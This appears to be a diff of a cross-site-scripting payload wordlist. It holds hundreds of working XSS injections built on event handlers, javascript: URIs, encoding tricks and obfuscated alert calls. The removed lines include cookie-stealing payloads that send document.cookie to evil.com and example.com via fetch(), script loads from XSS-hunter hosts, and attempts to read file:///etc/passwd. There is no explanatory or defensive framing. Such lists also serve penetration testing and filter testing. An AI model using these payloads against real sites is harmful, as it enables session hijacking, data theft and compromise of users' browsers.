@@ -1,37 +1,10 @@
 <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
-<xss onkeydown="alert(1)" contenteditable style=display:block>test</xss>
-<xss onkeypress="alert(1)" contenteditable style=display:block>test</xss>
-<xss onkeyup="alert(1)" contenteditable style=display:block>test</xss>
-<xss onmousedown="alert(1)" style=display:block>test</xss>
-<xss onmouseenter="alert(1)" style=display:block>test</xss>
-<xss onmouseleave="alert(1)" style=display:block>test</xss>
-<xss onmousemove="alert(1)" style=display:block>test</xss>
-<xss onmouseout="alert(1)" style=display:block>test</xss>
-<xss onmouseover="alert(1)" style=display:block>test</xss>
-<xss onmouseup="alert(1)" style=display:block>test</xss>
-<xss onmousewheel=alert(1) style=display:block>requires scrolling
-<video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls>
-<body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>
-<a onpaste="alert(1)" contenteditable>test</a>
-<xss ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</xss>
-<xss draggable="true" ondrag="alert(1)" style=display:block>test</xss>
-<xss draggable="true" ondragend="alert(1)" style=display:block>test</xss>
-<xss draggable="true" ondragenter="alert(1)" style=display:block>test</xss>
-<xss draggable="true" ondragexit="alert(1)" style=display:block>test</xss>
-<xss draggable="true" ondragleave="alert(1)" style=display:block>test</xss>
-<div draggable="true" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>
-<xss draggable="true" ondragstart="alert(1)" style=display:block>test</xss>
-<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>
-<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>
-<form onformdata="alert(1)"><button>Click</button></form>
 <input oninput=alert(1) value=xss>
 <form><input oninvalid=alert(1) required><input type=submit>
 <a onbeforecopy="alert(1)" contenteditable>test</a>
 <a onbeforecut="alert(1)" contenteditable>test</a>
-<xss contenteditable onbeforeinput=alert(1)>test
-<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>
 <input onchange=alert(1) value=xss>
 <xss onclick="alert(1)" style=display:block>test</xss>
 <dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>
@@ -41,43 +14,27 @@
 <style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart="alert(1)"></xss>
 <body onbeforeprint=console.log(1)>
 <body onbeforeprint=console.log(1)>
-<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-<video oncanplaythrough=alert(1)><source src="validvideo.mp4" type="video/mp4"></video>
-<audio controls ondurationchange=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
 <body onpageshow=alert(1)>
-<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 <body onpopstate=print()>
-<audio controls onprogress=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
 <svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
 <body onresize="print()">
 <body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
 <xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
-<audio controls onsuspend=alert(1)><source src=validaudio.mp3 type=audio/mpeg></audio>
-<audio controls autoplay ontimeupdate=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> 
 <details ontoggle=alert(1) open>test</details>
 <svg><animate onend=alert(1) attributeName=x dur=1s>
-<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
 <audio src/onerror=alert(1)>
 <a id=x tabindex=1 onfocus=alert(1)></a>
 <xss onfocus=alert(1) autofocus tabindex=1>
 <a id=x tabindex=1 onfocusin=alert(1)></a>
 <body onhashchange="print()">
 <body onload=alert(1)>
-<audio onloadeddata=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
-<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
 <video onloadstart="alert(1)"><source></*>
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
 alert = window["al"+"ert"] 
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <svg/onload=window["al"+"ert"]1337>
-'"><script src=https://hacker.xss.ht></script>'
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
 "><track/onerror='confirm1'>
-"><script src="https://js.rip/<custom.name>"></script>
-"><script src=//test.xss.ht></script>
-<script>$.getScript("//test.xss.ht")</script>
-<script+class=whoami>window.open("Calculator:///");</script>
 <script>alert('XSS')</script>
 <img src=x onerror=alert('XSS')>
 <svg onload=alert('XSS')>
@@ -95,19 +52,14 @@ alert = window["al"+"ert"]
 <meta http-equiv="refresh" content=" ;url=javascript:alert('XSS');">
 <table background="javascript:alert('XSS')"></table>
 <div style="background-image: url(javascript:alert('XSS'));">
-<div onmouseover="alert('XSS')">Hover me</div>
-<button onclick="alert('XSS')">Click me</button>
-<textarea onfocus="alert('XSS')">Focus on me</textarea>
 <keygen autofocus onfocus="alert('XSS')">
 <base href="javascript:alert('XSS');">
 <bgsound src="javascript:alert('XSS');">
 <isindex action="javascript:alert('XSS')">
-<command onclick="alert('XSS')">Command</command>
 <fieldset form="javascript:alert('XSS')">
 <frameset onload="alert('XSS')"></frameset>
 <applet code="javascript:alert('XSS')"></applet>
 <base target="javascript:alert('XSS')">
-<listing onmouseover="alert('XSS')">Hover me</listing>
 <nobr onclick="alert('XSS')">Click me</nobr>
 <plaintext onfocus="alert('XSS')">Focus on me</plaintext>
 <spacer onclick="alert('XSS')">Click me</spacer>
@@ -119,52 +71,30 @@ alert = window["al"+"ert"]
 <div data-text="&lt;script&gt;alert('XSS')&lt;/script&gt;"></div>
 <input type="text" onfocus="alert('XSS')">
 <button formaction="javascript:alert('XSS')">Click me</button>
-<div oncopy="alert('XSS')">Copy me</div>
-<div oncut="alert('XSS')">Cut me</div>
-<div onpaste="alert('XSS')">Paste here</div>
-<form onsubmit="alert('XSS')">
-<select onchange="alert('XSS')"><option>Option</option></select>
-<menuitem onclick="alert('XSS')">Click me</menuitem>
 <input type="image" src="invalid" onerror="alert('XSS')">
 <frame src="javascript:alert('XSS');"></frame>
-<div draggable="true" ondragstart="alert('XSS')">Drag me</div>
 <object type="text/html" data="javascript:alert('XSS');"></object>
 <div style="border-image-source: url(javascript:alert('XSS'));">
 <input type="text" pattern=" { ,}" title='XSS{alert("XSS")}' />
-<progress value=" " max=" " onmouseover="alert('XSS')"></progress>
-<command onclick="alert('XSS')">Command</command>
 <data value="javascript:alert('XSS')">Click me</data>
 <datalist id="xss"><option value="&lt;script&gt;alert('XSS')&lt;/script&gt;"></datalist>
-<label onmouseenter="alert('XSS')">Hover me</label>
 <meter value=" " min=" " max=" " low=" " high=" " onmouseover="alert('XSS')"></meter>
-<optgroup label="XSS" onmouseenter="alert('XSS')"></optgroup>
- <output onfocus="alert('XSS')">Focus on me</output>
-<progress onmouseover="alert('XSS')"></progress>
-<summary onmouseenter="alert('XSS')">Hover me</summary>
-<textarea oninput="alert('XSS')"></textarea>
-<track oncuechange="alert('XSS')"></track>
 <a href="javascript:alert('XSS');">Click me</a>
 <link rel="stylesheet" href="data:text/css,*{background:url('javascript:alert(XSS)')}">
 <iframe srcdoc="<img src=x onerror=alert('XSS')>"></iframe>
 <div style="list-style-image: url(javascript:alert('XSS'));">
-<form><button formaction="javascript:alert('XSS')">Click me</button></form>
 <div data-url="javascript:alert('XSS')"></div>
 <table background="javascript:alert('XSS')">
 <div style="content: url(javascript:alert('XSS'));">
 <style>*{background-image: url(javascript:alert('XSS'))}</style>
-<div style="cursor: url(javascript:alert('XSS')), auto;">
 meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 <input type="button" value="XSS" onclick="alert('XSS')">
 <img src="x" onerror="alert('XSS')">
-<div onmousedown="alert('XSS')">Click me</div>
 <svg><animate attributeName="xlink:href" to="javascript:alert('XSS')" /></svg>
 <math href="javascript:alert('XSS')" />
-<div style="behavior:url(#default#AnchorClick);display:inline-block" onclick="alert('XSS')">Click me</div>
 <xss style="x:expression(alert('XSS'))">
 <form action="javascript:alert('XSS')"><input type="submit" value="XSS"></form>
-<div onmouseenter="alert('XSS')">Hover me</div>
 <div style="width:expression(alert('XSS'))">
-<div ondrag="alert('XSS')">Drag me</div>
 <marquee onstart="alert('XSS')">Start</marquee>
 <iframe src="javascript:alert('XSS')"></iframe>
 <object data="javascript:alert('XSS')"></object>
@@ -172,12 +102,6 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 <style>@import 'javascript:alert(XSS)';</style>
 <link rel="import" href="data:text/html,<script>alert('XSS')</script>">
 <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
-<div onkeypress="alert('XSS')">Press a key</div>
-<div onkeydown="alert('XSS')">Press a key</div>
-<div onkeyup="alert('XSS')">Press a key</div>
-<button oncontextmenu="alert('XSS')">Right-click me</button>
-<div contenteditable onblur="alert('XSS')">Edit me and unfocus</div>
-<input onblur="alert('XSS')" value="Blur me">
 %3Cscript%3E%60alert%60%28%2FXSS%2F%29%3B%3C%2Fscript%3E
 %3Cimg%20src%3Dx%20onerror%3D%60alert%28%2FXSS%2F%29%60%3E
 %3Csvg%20onload%3D%60alert%28%2FXSS%2F%29%60%3E%3C%2Fsvg%3E
@@ -185,15 +109,12 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %3Cinput%20type%3D%22text%22%20value%3D%22%3Cscript%3Ealert%28%2FXSS%2F%29%3C%2Fscript%3E%22%3E
 %3Cbody%20onload%3D%60alert%28%2FXSS%2F%29%60%3E%3C%2Fbody%3E
 %3Cdiv%20style%3D%22width%3A%20expression%28alert%28%2FXSS%2F%29%29%3B%22%3E%3C%2Fdiv%3E
-%3Cbutton%20onclick%3D%60alert%28%2FXSS%2F%29%60%3EClick%20me%3C%2Fbutton%3E
-%3Cform%20action%3D%22javascript%3Aalert%28%2FXSS%2F%29%22%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E
 %3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%220%3Burl%3Djavascript%3Aalert%28%2FXSS%2F%29%22%3E
 %3Csvg%20onload%3D%60alert%28%60XSS%60%29%60%3E
 %3Cimg%20src%3Dx%20onerror%3D%60alert%28%60XSS%60%29%60%3E
 %3Cbody%20onload%3D%60alert%28%60XSS%60%29%60%3E
 %3Ciframe%20src%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E%3C%2Fiframe%3E
 %3Cinput%20onfocus%3D%60alert%28%60XSS%60%29%60%3E
-%3Cbutton%20onclick%3D%60alert%28%60XSS%60%29%60%3EClick%3C%2Fbutton%3E
 %3Cform%20action%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E%3Cinput%20type%3Dsubmit%3E%3C%2Fform%3E
 %3Cobject%20data%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E%3C%2Fobject%3E
 %3Cembed%20src%3D%60javascript%3Aalert%28%60XSS%60%29%60%3E
@@ -204,16 +125,6 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 “><img src=x onerror=prompt(document.domain);>.pdf
 <svg onload=alert&#0000000040"1")>
 %22%3E%3Cimg%20src%3Dx%20onerror%3Dprompt(%27document.domain%27)%3B%3E
-/"><script>fetch('https://evil.com/?cookie=' + document.cookie)</script>
-/"><img src=x onerror="fetch('https://evil.com/?cookie=' + document.cookie)">
-/"><body onload="fetch('https://evil.com/?cookie=' + document.cookie)">
-/"><iframe src="javascript:fetch('https://evil.com/?cookie=' + document.cookie)"></iframe>
-/"><svg onload="fetch('https://evil.com/?cookie=' + document.cookie)">
-/"><object data="javascript:fetch('https://evil.com/?cookie=' + document.cookie)"></object>
-/"><embed src="javascript:fetch('https://evil.com/?cookie=' + document.cookie)">
-/"><link rel="stylesheet" href="javascript:fetch('https://evil.com/?cookie=' + document.cookie)">
-/"><meta http-equiv="refresh" content="0;url=javascript:fetch('https://evil.com/?cookie=' + document.cookie)">
-/"><form action="https://evil.com"><input name="cookie" value=document.cookie></form>
 %22%3E%3Cscript%3Ealert(%27XSS1%27)%3C/script%3E
 %22%3E%3Cimg%20src=x%20onerror=%22alert(%27XSS2%27)%22/%3E
 %22%3E%3Csvg%20onload=%22alert(%27XSS3%27)%22/%3E
@@ -239,14 +150,6 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %22%3E%3Cembed%20src=%22javascript:eval(%27alert(23)%27)%22/%3E
 %22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:eval(%27alert(24)%27)%22/%3E
 %22%3E%3Cform%20action=%22javascript:eval(%27alert(25)%27)%22%3E%3Cinput%20name=%22x%22%20value=%22x%22/%3E%3C/form%3E
-%22%3E%3Cimg%20src=x%20onerror=%22fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Csvg%20onload=%22fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Cscript%3Efetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%3C/script%3E
-%22%3E%3Cbody%20onload=%22fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Ciframe%20src=%22javascript:fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22%3E%3C/iframe%3E
-%22%3E%3Cobject%20data=%22javascript:fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22%3E%3C/object%3E
-%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Cform%20action=%22https://example.com%22%3E%3Cinput%20name=%22cookie%22%20value=%22document.cookie%22/%3E%3C/form%3E
 %22%3E%3Cimg%20src=x%20onerror=%22document.write(%27%3Cscript%3Ealert(26)%3C/script%3E')%22/%3E
 %22%3E%3Csvg%20onload=%22document.write(%27%3Cscript%3Ealert(27)%3C/script%3E')%22/%3E
 %22%3E%3Ciframe%20src=%22javascript:document.write(%27%3Cscript%3Ealert(28)%3C/script%3E')%22%3E%3C/iframe%3E
@@ -256,12 +159,6 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %22%3E%3Ciframe%20src=%22javascript:document.write(%27%3Csvg%20onload=alert(32)%3E%3C/svg%3E')%22%3E%3C/iframe%3E
 %22%3E%3Cbody%20onload=%22document.write(%27%3Csvg%20onload=alert(33)%3E%3C/svg%3E')%22/%3E
 %22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:document.write(%27%3Csvg%20onload=alert(34)%3E%3C/svg%3E')%22/%3E
-%22%3E%3Cimg%20src=x%20onerror=%22eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
-%22%3E%3Csvg%20onload=%22eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
-%22%3E%3Cbody%20onload=%22eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
-%22%3E%3Ciframe%20src=%22javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22%3E%3C/iframe%3E
-%22%3E%3Cobject%20data=%22javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22%3E%3C/object%3E
-%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
 %22%3E%3Cscript%3Ealert(%27XSS35%27)%3C/script%3E
 %22%3E%3Cimg%20src=x%20onerror=%22alert(%27XSS36%27)%22/%3E
 %22%3E%3Csvg%20onload=%22alert(%27XSS37%27)%22/%3E
@@ -286,15 +183,6 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %22%3E%3Cobject%20data=%22javascript:eval(%27alert(56)%27)%22%3E%3C/object%3E
 %22%3E%3Cembed%20src=%22javascript:eval(%27alert(57)%27)%22/%3E
 %22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:eval(%27alert(58)%27)%22/%3E
-%22%3E%3Cform%20action=%22javascript:eval(%27alert(59)%27)%22%3E%3Cinput%20name=%22x%22%20value=%22x%22/%3E%3C/form%3E
-%22%3E%3Cimg%20src=x%20onerror=%22fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Csvg%20onload=%22fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Cscript%3Efetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%3C/script%3E
-%22%3E%3Cbody%20onload=%22fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Ciframe%20src=%22javascript:fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22%3E%3C/iframe%3E
-%22%3E%3Cobject%20data=%22javascript:fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22%3E%3C/object%3E
-%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%22/%3E
-%22%3E%3Cform%20action=%22https://example.com%22%3E%3Cinput%20name=%22cookie%22%20value=%22document.cookie%22/%3E%3C/form%3E
 %22%3E%3Cimg%20src=x%20onerror=%22document.write(%27%3Cscript%3Ealert(60)%3C/script%3E')%22/%3E
 %22%3E%3Csvg%20onload=%22document.write(%27%3Cscript%3Ealert(61)%3C/script%3E')%22/%3E
 %22%3E%3Ciframe%20src=%22javascript:document.write(%27%3Cscript%3Ealert(62)%3C/script%3E')%22%3E%3C/iframe%3E
@@ -304,46 +192,13 @@ meta http-equiv="refresh" content=" ; url=javascript:alert('XSS');">
 %22%3E%3Ciframe%20src=%22javascript:document.write(%27%3Csvg%20onload=alert(66)%3E%3C/svg%3E')%22%3E%3C/iframe%3E
 %22%3E%3Cbody%20onload=%22document.write(%27%3Csvg%20onload=alert(67)%3E%3C/svg%3E')%22/%3E
 %22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:document.write(%27%3Csvg%20onload=alert(68)%3E%3C/svg%3E')%22/%3E
-%22%3E%3Cimg%20src=x%20onerror=%22eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
-%22%3E%3Csvg%20onload=%22eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
-%22%3E%3Cbody%20onload=%22eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
-%22%3E%3Ciframe%20src=%22javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22%3E%3C/iframe%3E
-%22%3E%3Cobject%20data=%22javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22%3E%3C/object%3E
-%22%3E%3Cmeta%20http-equiv=%22refresh%22%20content=%220;%20url=javascript:eval(%27fetch(%27https://example.com/?cookie=%27%20+%20document.cookie)%27)%22/%3E
-ddd");<​/script><​script>alert("XSS By Az3m");<​/script><​script>aaa("
-<iframe src='file:///etc/passwd' width='600' height='600'>
-<embed src='file:///etc/passwd' width='600' height='600'>
-<object data='file:///etc/passwd' width='600' height='600' type='text/html'>
-<portal src='file:///etc/passwd' id='portal'>
-<link rel='attachment' href='file:///etc/passwd'>
-<annotation file='/etc/passwd' content='/etc/passwd' icon='Graph' title='Attached File' pos-x='195'>
-<​meta http-equiv='refresh' content='0;url=file:///etc/passwd'>
-<​script>window.location = "file:///etc/passwd";<​/script>
-<img src="x" onerror​="window.location='file:///etc/passwd'">
-<link rel="import" href="http://Attacker-Server/malicious.html">
-<!--#include file="file:///etc/passwd" -->
-"><a nope="%26quot;x%26quot;"onmouseover​="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
-"><​script src="https://js.rip/<custom.name>"><​/script>
-"><​script src=//<custom.subdomain>.xss.ht><​/script>
-<​script>$.getScript("//<custom.subdomain>.xss.ht")<​/script>
+ddd");<​/script><​script>alert("XSS");<​/script><​script>aaa("
 6'%22()%26%25%22%3E%3Csvg/onload​=prompt(document.domain)%3E/
 %27"></a><​/script></title></form></span><​/meta><​/style></iframe></noscript></textarea></xmp></pre><​ScRiPt>alert(/hacked%20By%20Ahmad/)<​/sCrIpT>
 javascript​:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>Click me</button><hvita onbeforetoggle​="+a+b+c+" popover id=x>Hvita</hvita>")
 <svg%20onx=()%20onload=(confirm)(document.domain)>
-"><a nope="%26quot;x%26quot;"onmouseover​="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
-<details open ontoggle​="(()=>alert`ibrahimxss`)()"></details>
-"><body/oNpagEshoW​=(prompt)()>
-"><body/oNpagEshoW​=(prompt)(document.domain)>
-"><input/onfocus​=(confirm)(document.domain)>
-"><body/oNpagEshoW​=(confirm)(document.domain)>
-"><body/onfocus​=(confirm)(document.domain)>
-"><Body/oNpagEshoW​=(prompt)(1)>
-<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS​=alert`1` //
-"><body/oNpagEshoW​=(confirm)(document.domain)>
 <%2FsCrIpT><​ScRiPt>alert(document.cookie)<%2FsCrIpT>
-<img%20src=x%20onmouseover=prompt%26%2300000000000000000040;document.cookie%26%2300000000000000000041;
 %2522%253e%253cscript%253ealert%2528%2527BUG XSS By Wildan!%2527%2529%253c%252fscript%253
-">><plaintext%2Fonmouseover%3Dprompt(1)+><​script>prompt(1)<%2Fscript>
 "><img/src=%20only=1%20OnErRor=x=alert`XSS`><!--
 sm"*alert(1)*"
 "*alert(1)*"
@@ -351,4 +206,3 @@ sm"*alert(1)*"
 <svg/onload​=alert(1)>
 ><%2fSCRIPT>">'><​SCRIPT>alert(String.fromCharCode(88,83,83)) <%2fSCRIPT> `
 `'%3balert(String.fromCharCode(88,83,83))%2f%2f'%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f"%3balert(String.fromCharCode(88,83,83))%2f%2f--
-nbq60%3cscript%3ealert(1)%3c%2fscript%3efdum1
